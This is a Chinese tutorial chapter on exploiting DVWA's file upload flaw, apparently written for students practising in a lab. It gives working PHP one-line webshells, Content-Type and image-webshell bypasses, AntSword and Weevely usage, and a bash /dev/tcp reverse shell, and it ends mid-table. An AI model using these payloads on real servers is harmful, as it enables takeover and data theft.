# 第9章 DVWA实战-文件上传漏洞 📁

## 开篇引入：快递柜里的炸弹 📦💣

想象一下，你住的小区楼下有个快递柜，任何人都可以往里面放快递，快递员也从来不检查里面放的是什么。本来大家都放正常的包裹，结果有一天，一个坏人偷偷往里面放了一个定时炸弹……💥

**文件上传漏洞**，就跟这个快递柜的故事一模一样！

现在的网站，很多都有上传功能吧？比如：
- 社交网站上传头像 📸
- 论坛上传附件 📎
- 博客上传图片 🌄
- 网盘上传文件 ☁️

这些功能就像是网站给你开的"快递柜"，你可以往服务器上传文件。但是！如果网站没有好好检查你上传的是什么东西，那可就危险了！

坏人可以利用这个漏洞，往服务器上传一个**恶意的脚本文件**（比如PHP文件），然后通过浏览器访问这个文件，就能在服务器上执行任意代码。这就相当于你把炸弹放进了快递柜，然后远程引爆了它！

这一章，我们就来好好研究一下这个"快递柜炸弹"——文件上传漏洞！🚀

### 📍 先看你该访问哪个 URL（三选一）

**本章靶场模块：Upload**（上传头像那个功能）。左边栏点 Upload 进入。上传成功后 Kali 同学最方便，**可以直接 ls 服务器 uploads 目录** 看文件落没落地：

| 搭建方式 | 本章靶场页面地址 | 上传后 shell.jpg / shell.php 落地 URL（你待会去菜刀连或 LFI 包含就是用这个）|
|---|---|---|
| 🪟 Windows PHPStudy | `http://localhost/dvwa/vulnerabilities/upload/` | `http://localhost/dvwa/hackable/uploads/shell.php` |
| 🐧 **Kali LAMP ✅** | `http://你的KaliIP/dvwa/vulnerabilities/upload/` | `http://你的KaliIP/dvwa/hackable/uploads/shell.php`（Kali 终端 `ls -la /var/www/html/dvwa/hackable/uploads/` 也能直接看！）|
| 🐳 Docker 版 | `http://你的KaliIP:4280/vulnerabilities/upload/`（无 /dvwa 这层）| `http://你的KaliIP:4280/hackable/uploads/shell.php`；容器内可用 `docker exec dvwa-test ls /var/www/html/hackable/uploads` 看（⚠️ Docker pull 拉不动？直接换 ch04 §4.5 Kali LAMP 或 §4.7 XAMPP ✅）|

<svg viewBox="0 0 1100 470" width="100%" xmlns="http://www.w3.org/2000/svg" style="width:100%;max-width:980px;margin:18px auto;display:block;border:1px solid #2a2a3a;border-radius:14px;background:#0f1120;">
  <defs><linearGradient id="fu1" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#8957e5"/><stop offset="100%" stop-color="#321b6b"/></linearGradient><linearGradient id="fu2" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#ff7b72"/><stop offset="100%" stop-color="#8d1515"/></linearGradient><linearGradient id="fu3" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#238636"/><stop offset="100%" stop-color="#0a3716"/></linearGradient><marker id="fup" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto"><path d="M0,0 L0,6 L9,3 z" fill="#a371f7"/></marker><marker id="fug" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto"><path d="M0,0 L0,6 L9,3 z" fill="#3fb950"/></marker></defs>
  <text x="550" y="34" text-anchor="middle" fill="#fff" font-size="20" font-weight="bold" font-family="Arial">图 9-1  文件上传 · 4 档难度 "防护金字塔" + 对应绕过思路（从菜到神）</text>
  <!-- 左：攻击端 上传木马 -->
  <rect x="18" y="64" width="240" height="388" rx="14" fill="url(#fu1)" stroke="#a371f7" stroke-width="1.4"/>
  <text x="138" y="96" text-anchor="middle" fill="#fff" font-family="Arial" font-weight="bold" font-size="15">🎩  攻击端 Kali（准备上传的 4 类 Payload）</text>
  <g font-family="Arial" font-size="11.5" fill="#f0e4ff">
    <rect x="34" y="116" width="208" height="54" rx="6" fill="#000" opacity="0.4"/>
    <text x="44" y="136" fill="#ff80a0" font-weight="bold">① 裸 PHP shell.php（最简单）</text>
    <text x="44" y="154" font-family="Consolas,monospace">&lt;?php @eval($_POST['x']);?&gt;</text>
    <text x="44" y="168" font-family="Consolas,monospace">// 中国菜刀/蚁剑 密码=x</text>
    <rect x="34" y="182" width="208" height="54" rx="6" fill="#000" opacity="0.4"/>
    <text x="44" y="202" fill="#ffd089" font-weight="bold">② 改 Content-Type + 改后缀 .php3/.phtml</text>
    <text x="44" y="220" font-family="Consolas,monospace">Content-Type: image/png (Burp里改)</text>
    <text x="44" y="234" font-family="Consolas,monospace">文件后缀：shell.php5 / shell.phtml</text>
    <rect x="34" y="248" width="208" height="54" rx="6" fill="#000" opacity="0.4"/>
    <text x="44" y="268" fill="#9de8b0" font-weight="bold">③ 图片马 + .htaccess + user.ini</text>
    <text x="44" y="286" font-family="Consolas,monospace">cat shell.php pic.jpg &gt; 马.jpg （GD库头部16字节）</text>
    <text x="44" y="300" font-family="Consolas,monospace">.htaccess：AddType image/jpeg .php</text>
    <rect x="34" y="314" width="208" height="54" rx="6" fill="#000" opacity="0.4"/>
    <text x="44" y="334" fill="#79c0ff" font-weight="bold">④ 竞争条件上传 + 解析漏洞（老版本Apache/Nginx）</text>
    <text x="44" y="352" font-family="Consolas,monospace">burp intruder 20线程 先包含再被删</text>
    <text x="44" y="366" font-family="Consolas,monospace">/shell.php/xx.jpg Nginx pathinfo解析</text>
    <text x="44" y="398" fill="#ffe16b" font-weight="bold">⑤ Burp 全程抓包 🔥：POST multipart/form-data</text>
    <text x="44" y="416" fill="#ffe16b" font-weight="bold">⑥ 上传完后：LFI 包含 or 直接访问 or 蚁剑连接！</text>
    <text x="44" y="434" fill="#ff8b8b" font-weight="bold">👉 最终目标：访问 URL → PHP 代码执行！✅</text>
  </g>
  <line x1="258" y1="143" x2="278" y2="143" stroke="#a371f7" stroke-width="2" marker-end="url(#fup)"/>
  <line x1="258" y1="210" x2="278" y2="210" stroke="#a371f7" stroke-width="2" marker-end="url(#fup)"/>
  <line x1="258" y1="276" x2="278" y2="276" stroke="#a371f7" stroke-width="2" marker-end="url(#fup)"/>
  <line x1="258" y1="342" x2="278" y2="342" stroke="#a371f7" stroke-width="2" marker-end="url(#fup)"/>
  <!-- 中间：DVWA 四档防护金字塔 -->
  <rect x="278" y="64" width="542" height="388" rx="14" fill="#10173a" stroke="#ff7b72" stroke-width="1.2"/>
  <text x="549" y="96" text-anchor="middle" fill="#fff" font-family="Arial" font-weight="bold" font-size="16">🛡️  DVWA 四档防护金字塔（Low→Impossible 越往上越难攻）</text>
  <g font-family="Arial" font-size="11.5" fill="#fff">
    <!-- LOW 最底层，最宽，最易攻破 -->
    <polygon points="304,428 792,428 714,350 382,350" fill="#3bff9a18" stroke="#3bff9a" stroke-width="1.5"/>
    <text x="549" y="378" text-anchor="middle" font-size="15" font-weight="bold" fill="#3bff9a">第 1 层 · LOW 🌱  无任何检查（通过率 99%）</text>
    <text x="549" y="398" text-anchor="middle">直接 shell.php 一扔就成功 ✅  →  访问 /dvwa/hackable/uploads/shell.php 直接执行！</text>
    <text x="549" y="416" text-anchor="middle" font-family="Consolas,monospace" fill="#ff8b8b">Payload：&lt;?php system($_GET['c']); ?&gt;   然后 ?c=id 就能执行命令</text>
    <!-- MED 第 2 层 -->
    <polygon points="382,350 714,350 652,280 444,280" fill="#ffe16b18" stroke="#ffe16b" stroke-width="1.5"/>
    <text x="549" y="308" text-anchor="middle" font-size="14" font-weight="bold" fill="#ffe16b">第 2 层 · MED 🌿  只检查 Content-Type / 黑名单简单（通过率 70%）</text>
    <text x="549" y="326" text-anchor="middle">Burp 抓包 把 Content-Type: application/octet-stream 改成 image/png 或 image/jpeg 就绕过；或者后缀改成 .php3 .phtml</text>
    <text x="549" y="344" text-anchor="middle" font-family="Consolas,monospace">Burp Intruder：Content-Type: image/gif ← 改完 Forward，上传成功</text>
    <!-- HIGH 第 3 层 -->
    <polygon points="444,280 652,280 604,210 492,210" fill="#ffa36b18" stroke="#ffa36b" stroke-width="1.5"/>
    <text x="549" y="238" text-anchor="middle" font-size="14" font-weight="bold" fill="#ffa36b">第 3 层 · HIGH 🌳  getimagesize() / 后缀白名单但可截断（通过率 25%）</text>
    <text x="549" y="256" text-anchor="middle">方法一：GIF89a + 图片马（cat a.gif b.php &gt; shell.php.gif）；方法二：shell.php%00.jpg 截断（php &lt; 5.3.4）</text>
    <text x="549" y="274" text-anchor="middle">方法三：.user.ini / .htaccess 上传 让 .jpg 当 PHP 解析（部分场景配合 LFI 包含图片马最佳）</text>
    <!-- IMPOSS 塔尖 -->
    <polygon points="492,210 604,210 570,160 526,160" fill="#ff6b8a18" stroke="#ff6b8a" stroke-width="1.5"/>
    <text x="548" y="182" text-anchor="middle" font-size="13" font-weight="bold" fill="#ff6b8a">第 4 层 · IMPOSSIBLE ⛔  真安全写法（通过率 0% 💀）</text>
    <text x="548" y="198" text-anchor="middle">白名单后缀+严格 MIME + imagecreatefromjpeg 二次渲染 + 随机文件名 uniqid() md5，图片马也被砍废</text>
  </g>
  <!-- 右：落地到 hackable/uploads + getshell -->
  <g>
    <rect x="840" y="64" width="242" height="388" rx="14" fill="url(#fu3)" stroke="#2ea043" stroke-width="1.4"/>
    <text x="961" y="96" text-anchor="middle" fill="#fff" font-family="Arial" font-weight="bold" font-size="15">🎯  服务器落地 + 菜刀 / 蚁剑连接（Kali 上 Weevely3 更香）</text>
    <g font-family="Consolas,monospace" font-size="11.2" fill="#dffbe6">
      <rect x="856" y="114" width="210" height="76" rx="6" fill="#000" opacity="0.55"/>
      <text x="870" y="134" fill="#9de8b0" font-weight="bold" font-family="Arial">① Kali 终端 看落地：</text>
      <text x="870" y="152">ls -la /var/www/html/dvwa/</text>
      <text x="870" y="168">      hackable/uploads/</text>
      <text x="870" y="184">      -rw-rw-r-- 1 www-data shell.php ✅</text>
      <rect x="856" y="204" width="210" height="76" rx="6" fill="#000" opacity="0.55"/>
      <text x="870" y="224" fill="#ff8b8b" font-weight="bold" font-family="Arial">② 浏览器 / curl 访问打命令：</text>
      <text x="870" y="242">curl "http://KALI_IP/dvwa/hackable/uploads/shell.php?c=id"</text>
      <text x="870" y="258">uid=33(www-data) gid=33 ✅</text>
      <text x="870" y="274">curl "...c=cat%20../../config/config.inc.php"</text>
      <rect x="856" y="296" width="210" height="70" rx="6" fill="#000" opacity="0.55"/>
      <text x="870" y="316" fill="#ffd089" font-weight="bold" font-family="Arial">③ Kali 原生 Weevely3 连 WebShell：</text>
      <text x="870" y="334"># 先生成：weevely generate pass shell.php</text>
      <text x="870" y="350"># 后连接：weevely http://.../shell.php pass</text>
      <text x="870" y="366">weevely&gt; whoami → www-data 🎉</text>
      <rect x="856" y="388" width="210" height="56" rx="6" fill="#000" opacity="0.55"/>
      <text x="870" y="408" fill="#c7a6ff" font-weight="bold" font-family="Arial">④ 终极：nc 反弹到 Kali ✨</text>
      <text x="870" y="426"># 监听：nc -lvnp 4444</text>
      <text x="870" y="442"># 请求：?c=bash%20-c%20'bash%20-i%20&gt;&amp;%20/dev/tcp/KALI_IP/4444%200&gt;&amp;1'</text>
    </g>
  </g>
</svg>

> 🔥 **Kali 同学本章速查：5 条命令造 shell + 图片马 + 连 Webshell**
> ```bash
> # 1. 先写一句话 shell.php（菜刀/蚁剑密码 x）
> cat > shell.php << 'EOF'
> <?php @eval($_POST['x']); echo "shell uploaded!"; ?>
> EOF
>
> # 2. Low 直接传；MED 传完用 Burp 把 Content-Type 改成 image/jpeg
> #    或改后缀：cp shell.php shell.phtml   # Apache 默认也解析
>
> # 3. HIGH 做图片马（保证 GD 头部合法 + %00 截断或配合文件包含）
> echo "GIF89a" > head.gif && cat head.gif shell.php > 马.jpg && cp 马.jpg 马.php%00.jpg  # 老 php <5.3 可断
>
> # 4. 上传成功后，浏览器 或 curl 直接打命令
> curl "http://你的KaliIP/dvwa/hackable/uploads/shell.php?c=id;whoami;pwd;uname%20-a"
>
> # 5. 上 Weevely 交互式终端（Kali 自带！比图形化蚁剑爽 10 倍）
> apt install -y weevely && weevely generate p@ss ~/weevely.php
> # 上传 weevely.php 后连接：
> weevely http://你的KaliIP/dvwa/hackable/uploads/weevely.php p@ss
> # weevely> audit_filesystem /etc/shadow；:backdoor_reversetcp 你的IP 4444 直接弹 Meterpreter！
> ```

---

## 文件上传漏洞原理 🔍

### 大白话解释 🗣️

文件上传漏洞，说白了就是：

> **网站有上传文件的功能，但是没有检查（或者检查不严）上传的文件类型和内容，导致攻击者可以上传PHP、ASP、JSP等脚本文件，进而控制整个服务器。**

咱们用更生活化的例子来理解：

假设你去餐厅吃饭 🍽️，餐厅有个"自带酒水"的政策。本来餐厅的意思是让你带点饮料酒水，结果你直接带了一个厨师进去 👨‍🍳，在餐厅厨房里自己做菜，还把餐厅的钱都拿走了……

餐厅的问题出在哪？**没有检查你带进去的是什么！** 他们以为你带的是酒水，结果你带了个"大活人"。

网站也是一样的道理。网站以为你上传的是图片、文档这些正常文件，结果你上传了一个PHP脚本，这个脚本可以在服务器上运行，想干啥干啥。

### 上传漏洞的危害有多大？😱

一句话总结：**文件上传漏洞是最直接、最危险的漏洞之一，因为它能直接让你拿到服务器的控制权！**

其他漏洞比如SQL注入，你可能还得慢慢"脱库"（偷数据），还不一定能拿到服务器权限。但是文件上传漏洞不一样——上传一个小马，直接就能控制服务器！

就好比你去偷东西，别的漏洞是从窗户缝里往里看，文件上传漏洞是直接给你一把大门钥匙 🔑。

### 漏洞形成的条件 📋

要形成文件上传漏洞，一般需要满足这几个条件：

1. **网站有上传功能** —— 这是前提，没有上传功能说啥都白搭
2. **上传的文件能被访问到** —— 上传了之后能通过URL访问，不然传了也白传
3. **上传的文件能被执行** —— 比如PHP文件能被服务器解析执行
4. **文件类型检查不严** —— 这就是漏洞所在了

这四个条件缺一不可。就像你要往快递柜放炸弹，得：
- 有快递柜（上传功能）
- 放进去之后能拿到（能访问）
- 炸弹能炸（能执行）
- 保安不检查（检查不严）

---

## WebShell是什么？🐚

### 大白话解释 🗣️

**WebShell**，翻译过来叫"网页外壳"，但你可以把它理解成一个**网页形式的后门**。

想象一下，你偷偷在别人家墙上凿了一个小洞，通过这个小洞你可以：
- 看他家有啥东西 👀
- 往里面放东西 📥
- 从里面拿东西 📤
- 甚至可以指挥他家的保姆干活 💪

WebShell就是这么个"小洞"，不过它是一个网页文件（比如shell.php），你把它上传到服务器上，然后用浏览器访问它，就能控制服务器了！

### 一句话木马 💬

WebShell有很多种，其中最简单、最经典的就是**一句话木马**。

为啥叫"一句话"？因为它真的就只有一行代码！

来，见识一下PHP版的一句话木马：

```php
<?php @eval($_POST['shell']); ?>
```

就这么短？对！就这么短！但它的威力可不小！

让我们拆解一下这句话是什么意思：

| 部分 | 含义 |
|------|------|
| `<?php ... ?>` | PHP代码的标记，告诉服务器这是PHP代码 |
| `@` | 错误抑制符，就算出错也不显示，比较隐蔽 |
| `eval()` | 这是最关键的！它会把字符串当作PHP代码来执行 |
| `$_POST['shell']` | 接收通过POST方式传过来的、名为shell的参数 |

连起来就是：**接收POST传过来的shell参数，然后把它当作PHP代码执行！**

这就相当于你给服务器留了个传话的，你说啥它就执行啥，能不危险吗？😱

举个例子，如果你通过POST传过去 `phpinfo();`，那它就会执行 `phpinfo()`，显示PHP的配置信息。如果你传过去更危险的代码……你懂的。

### 密码是什么？🔐

细心的同学可能发现了，上面的一句话里有个 `['shell']`，这个 `shell` 就是**密码**！

为啥叫密码呢？因为你必须知道这个参数名，才能给木马发送命令。就像你家的WiFi，你得知道密码才能连上。

当然，你也可以把密码改成别的，比如 `cmd`、`pass`、`x` 等等，越隐蔽越好。比如：

```php
<?php @eval($_POST['x']); ?>
```

这个的密码就是 `x`。

### WebShell管理工具 🛠️

有了一句话木马之后，你每次都用手敲POST命令吗？那也太累了！

于是就有了**WebShell管理工具**，它们是图形化的工具，你只需要填上马的地址和密码，就能像操作自己电脑一样操作服务器！

常见的工具有这么几个：

| 工具名 | 特点 | 图标 |
|--------|------|------|
| **中国菜刀** | 老牌经典，功能强大，但已经不更新了 | 🔪 |
| **蚁剑（AntSword）** | 菜刀的接班人，开源免费，功能更多，界面更好看 | 🐜 |
| **哥斯拉（Godzilla）** | 后起之秀，功能强大，自带加密免杀 | 🦎 |

这一章我们主要用**蚁剑**来演示，因为它免费、开源、更新活跃，新手也容易上手。

---

## Low级别通关 🎮

好了，理论讲了这么多，咱们赶紧上手试试！先从最简单的Low级别开始。

### 第一步：进入文件上传页面 📂

首先，打开你的DVWA，登录进去，把难度调到 **Low** 级别。

然后在左边的菜单里找到 **File Upload**（文件上传），点击进去。

你会看到一个这样的页面：
- 一个文件选择框 📁
- 一个"Upload"上传按钮 📤

看起来是不是很简单？这就是我们的目标了！

### 第二步：准备一句话木马 🐴

现在，我们来写一个最简单的PHP一句话木马。

打开你的记事本（或者随便什么文本编辑器），输入下面这句话：

```php
<?php @eval($_POST['shell']); ?>
```

然后把文件保存为 `shell.php`。

⚠️ **注意事项**：
- 文件名后缀一定要是 `.php`，不能是 `.txt`
- 文件编码要是 **UTF-8 无BOM**，不然可能会出问题
- 里面的代码不要写错了，尤其是那些符号

### 第三步：上传！📤

现在回到DVWA的文件上传页面，点击"选择文件"，找到你刚才保存的 `shell.php`，然后点击 **Upload** 按钮上传。

如果一切顺利，你会看到一个成功提示，大概长这样：

```
../../hackable/uploads/shell.php succesfully uploaded!
```

🎉 哇！这么轻松就上传成功了？Low级别也太low了吧！

### 第四步：找到上传后的路径 🗺️

上传成功了，但是我们得知道这个文件在哪，才能访问它对吧？

从提示信息里我们可以看到路径是 `../../hackable/uploads/shell.php`。

那完整的URL是什么呢？一般来说是这样的：

```
http://你的DVWA地址/hackable/uploads/shell.php
```

比如你的DVWA装在本地，那就是：
```
http://127.0.0.1/dvwa/hackable/uploads/shell.php
```

或者如果你是用PHPStudy的默认配置，可能是：
```
http://localhost/dvwa/hackable/uploads/shell.php
```

💡 **小提示**：如果你不确定路径，可以试试在上传成功的提示文字上右键，看看能不能直接打开链接。

### 第五步：用蚁剑连接 🐜

文件上传好了，现在我们用蚁剑来连接它！

如果你还没装蚁剑，先去装一个（安装方法参考第3章）。

打开蚁剑，然后按照下面的步骤来：

#### 步骤1：添加数据

在蚁剑的主界面，右键点击空白处，选择 **"添加数据"**，或者直接按快捷键 `Ctrl+A`。

#### 步骤2：填写连接信息

然后会弹出一个窗口，让你填信息：

| 选项 | 填什么 | 例子 |
|------|--------|------|
| **URL地址** | 你上传的shell.php的完整地址 | `http://127.0.0.1/dvwa/hackable/uploads/shell.php` |
| **连接密码** | 你一句话木马里的密码 | `shell`（因为我们写的是`$_POST['shell']`） |
| **编码设置** | 一般选UTF-8 | UTF-8 |

其他选项保持默认就行，不用改。

#### 步骤3：测试连接

填完之后，先别急着点添加，点击一下 **"测试连接"** 按钮。

如果显示 **"连接成功"**，那恭喜你！🎉 说明你的马好使！

如果连接失败了，别慌，检查一下：
- URL地址对不对？
- 密码对不对？
- 文件真的上传成功了吗？
- 服务器是不是在运行？

#### 步骤4：添加成功

测试连接没问题之后，点击 **"添加"** 按钮。

你就会在蚁剑的主界面看到你刚添加的这个Shell了！

### 第六步：看看能做什么？👀

双击你刚添加的这个Shell，进去看看！

哇塞，是不是就跟打开了自己电脑的资源管理器一样？

你可以：

1. **浏览文件** 📂 —— 看看服务器上都有啥文件
2. **上传下载文件** ⬆️⬇️ —— 想传什么传什么，想下什么下什么
3. **新建文件/文件夹** 📁 —— 在服务器上新建东西
4. **编辑文件** ✏️ —— 修改服务器上的文件
5. **删除文件** 🗑️ —— 删东西（别乱删啊！）

除了文件管理，蚁剑还有很多其他功能：

- **虚拟终端** 💻 —— 就像CMD一样，可以执行系统命令
- **数据库管理** 🗄️ —— 连接数据库，查看数据
- **文件管理** —— 刚才说过了
- ……还有很多高级功能

💡 **新手小练习**：试试在蚁剑里打开虚拟终端，输入 `whoami` 看看当前是什么用户，再输入 `ipconfig`（Windows）或者 `ifconfig`（Linux）看看服务器的IP信息。

### 源代码分析 🔬

为什么Low级别这么容易就上传成功了？我们来看看源代码就知道了。

点击页面右下角的 **"View Source"** 按钮，看看PHP源码：

```php
<?php
if( isset( $_POST[ 'Upload' ] ) ) {
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

    if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
        echo '<pre>Your image was not uploaded.</pre>';
    }
    else {
        echo "<pre>{$target_path} succesfully uploaded!</pre>";
    }
}
?>
```

看到了吗？**啥检查都没有！** 😂

代码直接就把文件移到上传目录里了，连你传的是什么类型的文件都不看一下。这就像快递柜的保安，看都不看就直接让你放东西进去，能不出事吗？

### ✅ 表 9-1 · Low 级别通关速查 & 失败对照表（一句话木马 + 蚁剑连 Shell 完整流程）

Low 级别任何文件都能上传，但 **95% 新手在最后"蚁剑连不上 Webshell"这步失败**。下面表格包含"写马 → 上传 → 确认路径 → 访问确认能执行 PHP → 蚁剑连接"完整 5 步，按顺序做：

| 步骤 | 做什么 | 点哪里 / 敲什么 | 看到什么算成功 ✅ | **失败了怎么办？（按报错抄作业）** ❌ |
|---|---|---|---|---|
| 0 | 切难度到 Low + 确认上传模块能打开 | DVWA Security → low → Submit；左边点 **Upload** | 页面有 "Choose a file to upload" 选择框 + **Upload** 按钮 + 最大上传尺寸提示 | 【没看到 Upload 菜单】→ DVWA 初始化有问题，回 setup.php 点 Create/Reset DB |
| 1 | 做一个 PHP 一句话木马文件（别抄错！一个字符都别错） | 新建 `shell.php` 文件，内容只写这一行（别加别的东西！）：<br>`<?php @eval($_POST['x']); ?>`<br>保存（编码必须是 **UTF-8 无 BOM**，Windows 不要用记事本！用 VSCode / Notepad++ 选 "UTF-8" 不是 "UTF-8 with BOM"）| 文件字节数 = 25 字节左右（正常） | 【怎么判断有没有 BOM？】→ VSCode 右下角看编码显示 UTF-8 不是 UTF-8 with BOM；BOM 会让 eval 前面多 3 个字节乱码 → 蚁剑连接直接报错 500，一定要无 BOM！ |
| 2 | 上传 shell.php + 记下真实上传路径 | DVWA Upload 页面 → 选择文件选 shell.php → Upload | 出现绿色提示：**`../../hackable/uploads/shell.php succesfully uploaded!`** → 把这个路径抄下来，拼到你的靶场上 | 【上传后路径是乱的 / 显示到不了 hackable/uploads】→ ① 你点 Upload 后绿色字里的路径是 DVWA 内部相对路径，**真实可访问的 URL = `http://靶场IP/dvwa/hackable/uploads/shell.php`**（注意是 hackable 不是 vulnerabilities 路径下！！90% 新手拼错路径！）；② 手动 Kali 上验证：`ls -la /var/www/html/dvwa/hackable/uploads/` 能看到 shell.php 才算真的上传成功 |
| 3 | **先浏览器访问马，确认 PHP 真的能执行（关键！跳过=浪费 1 小时调蚁剑）** | 新开页签访问刚才拼的 URL：<br>`http://靶场IP/dvwa/hackable/uploads/shell.php`<br>再带 POST 参数 `x=phpinfo();` 试（或地址栏 GET 版：如果你的马是 $_REQUEST 就能直接 `?x=phpinfo();`，但前面写的是 $_POST 所以得用 POST）<br>最快验证：Kali 终端 `curl -X POST -d "x=echo 1234567890;" http://靶场IP/dvwa/hackable/uploads/shell.php` | curl 返回里出现 **1234567890** = 一句话马执行成功 ✅ | 【curl 返回全白 / PHP Fatal error / 500】→ 99% 是 shell.php 内容写错了：① `@eval` 前面的 `@` 可以删，但 `$_POST['x']` 必须是单引号括起来的键名，双引号 `$_POST["x"]` 也可以但变量别写成 `$_POST[x]`（没引号！PHP 会把 x 当常量报 Notice）；② 靶场 PHP 版本禁用了 eval() → 你就别用 eval，换 `<?php system($_POST['x']); ?>`（命令执行型马，蚁剑也能连）；③ 访问直接 404 Not Found → 回去看步骤 2 你拼的路径！一定是 hackable/uploads 不是别的 |
| 4 | 配置蚁剑 / 中国蚁剑 / 中国菜刀 连接 | 打开蚁剑 → 右键空白 → 添加数据：<br>URL 地址：`http://靶场IP/dvwa/hackable/uploads/shell.php`<br>连接密码：`x`（和马里面 $_POST['x'] 的键名对应）<br>编码：UTF-8 → 点 "测试连接" | 蚁剑弹出 **"连接测试成功，配置已保存！"** + 能列出目录 / 上传下载文件 = 拿到 Webshell 🎉 | 【蚁剑测试连接失败 / 连接返回数据为空 / 提示解密失败】→ 按顺序排：① 先回到步骤 3 确保 curl 能打出 echo 内容（curl 能通蚁剑连不上 100% 是蚁剑配置错了）；② 密码 `x` 对不对（不要写成 X 大写）；③ 靶场开了 mod_security 等 WAF 把 eval 拦了 → 换系统命令马：上传 `<?php echo shell_exec($_POST['cmd']); ?>`，蚁剑密码是 cmd；④ DVWA 是 HTTPS 但你写 HTTP？看浏览器地址栏前缀全复制过去；⑤ 代理！开了 Burp 代理但证书不被蚁剑信任，关代理或给蚁剑加 CA 证书 |
| 5 | 验证拿到的权限（webshell 之后的事） | 蚁剑里双击打开虚拟终端 → 输入 `whoami; id; pwd` 回车 | 返回当前是 www-data / daemon / SYSTEM 等用户 | 【虚拟终端执行命令全空】→ PHP 里 `system()` / `exec()` / `shell_exec()` 被 disable_functions 禁用了（php.ini 里 disable_functions 配置），蚁剑看源码就能读文件，或者换 disable_functions bypass 的马 |

> 💡 **Low 查错口诀**：路径 90% 错 + shell 内容 8% 错 + 蚁剑配置 2% 错。**只要 curl -X POST 能打出你写的 echo/echo 12345，这个马就是好的，连不上一定是密码/URL/代理的问题，别再改 shell.php 了！**

---

## Medium级别绕过 🎯

Low级别太简单了，没挑战性对吧？我们来看看Medium级别怎么样。

把DVWA的难度调到 **Medium**，然后再去文件上传页面。

### 先试试直接上传？🤔

还是用我们刚才的 `shell.php`，直接上传试试。

结果怎么样？是不是报错了？大概会说：

```
Your image was not uploaded. We can only accept JPEG or PNG images.
```

哦？这次不行了？说只能上传JPEG或PNG图片。

### 为什么不行？看源码！🔍

老规矩，点 **"View Source"** 看看源码：

```php
<?php
if( isset( $_POST[ 'Upload' ] ) ) {
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
    $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ];
    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];

    if( ( $uploaded_type == "image/jpeg" || $uploaded_type == "image/png" ) &&
        ( $uploaded_size < 100000 ) ) {

        if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
            echo '<pre>Your image was not uploaded.</pre>';
        }
        else {
            echo "<pre>{$target_path} succesfully uploaded!</pre>";
        }
    }
    else {
        echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>';
    }
}
?>
```

哦！原来如此！这次它检查了两个东西：

1. **文件类型**（`$uploaded_type`）—— 必须是 `image/jpeg` 或者 `image/png`
2. **文件大小**（`$uploaded_size`）—— 必须小于100000字节（约100KB）

### Content-Type是什么？📝

那这个 `$uploaded_type` 是从哪来的呢？

它来自 `$_FILES['uploaded']['type']`，这个值是从哪来的？答案是：**HTTP请求头里的 Content-Type 字段！**

什么是 Content-Type？

咱们打个比方：你去寄快递，快递单上有个"物品类型"栏，你可以填"衣服"、"食品"、"电子产品"等等。快递员就根据这个栏位来判断你寄的是什么。

但是！这个"物品类型"是**你自己填的**！你填啥就是啥，快递员不拆开看。你完全可以把炸弹填成"衣服"。

Content-Type 也是一样的道理，它是浏览器在上传文件的时候，在请求头里告诉服务器"这个文件是什么类型的"。但是这个值是**可以被篡改的**！

服务器如果只靠 Content-Type 来判断文件类型，那就太天真了！😏

### 怎么绕过？抓包改Content-Type！🕵️

既然Content-Type可以改，那我们就来改一改！

怎么改呢？用抓包工具，比如Burp Suite。

下面是详细步骤：

#### 步骤1：配置Burp代理

确保你的Burp Suite已经打开，并且浏览器已经配置好代理了（不会的话回去看第3章）。

#### 步骤2：开启拦截

在Burp的 **Proxy** 标签页下，确保 **Intercept is on**（拦截已开启）。

#### 步骤3：上传文件

回到浏览器，选择 `shell.php` 文件，点击Upload按钮上传。

#### 步骤4：在Burp里改包

这时候Burp应该已经抓到包了。你会看到类似这样的内容：

```
POST /dvwa/vulnerabilities/upload/ HTTP/1.1
Host: 127.0.0.1
...
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary...

------WebKitFormBoundary...
Content-Disposition: form-data; name="uploaded"; filename="shell.php"
Content-Type: application/octet-stream

<?php @eval($_POST['shell']); ?>
------WebKitFormBoundary...
```

看到了吗？有一行是：
```
Content-Type: application/octet-stream
```

这个就是文件的类型，现在是 `application/octet-stream`（二进制流，也就是PHP文件的默认类型）。

我们要把它改成图片的类型，比如 `image/jpeg`。

把这一行改成：
```
Content-Type: image/jpeg
```

⚠️ **注意**：只改Content-Type的值，文件名（filename）先不用改，保持 `shell.php` 就行。

#### 步骤5：放包

改完之后，点击 **Forward**（放包）按钮，把请求发出去。

然后再点几次Forward，把剩下的请求都放出去，直到Burp不再拦截。

#### 步骤6：查看结果

回到浏览器，看看是不是上传成功了？

🎉 成功了！我们绕过了Medium级别的检查！

现在用蚁剑连接一下试试，跟之前一样，地址还是 `http://127.0.0.1/dvwa/hackable/uploads/shell.php`，密码还是 `shell`。

完美！照样能用！✅

### 小结 📝

Medium级别只检查了 Content-Type，这是非常不安全的，因为 Content-Type 是客户端传来的，可以随意篡改。

这就好比保安只看你快递单上填的"物品类型"，你填"衣服"他就信了，根本不打开看看里面到底是什么。

所以，**只靠前端或者HTTP头来验证文件类型是完全靠不住的！**

### ✅ 表 9-2 · Medium 级别通关速查 & 失败对照表（只校验 Content-Type：Burp 改头两种打法）

DVWA Medium 源码是检查 `$_FILES['uploaded']['type']`（上传 HTTP 请求里客户端报的 Content-Type），典型是 `if( $uploaded_type == 'image/jpeg' && $uploaded_size < ... )` 才允许。**这个值是客户端发的，想写啥写啥！** 下面两条路必中一条：

| 步骤 | 做什么 | Burp / 终端里怎么操作 | 看到什么算成功 ✅ | **失败了怎么办？（按报错抄作业）** ❌ |
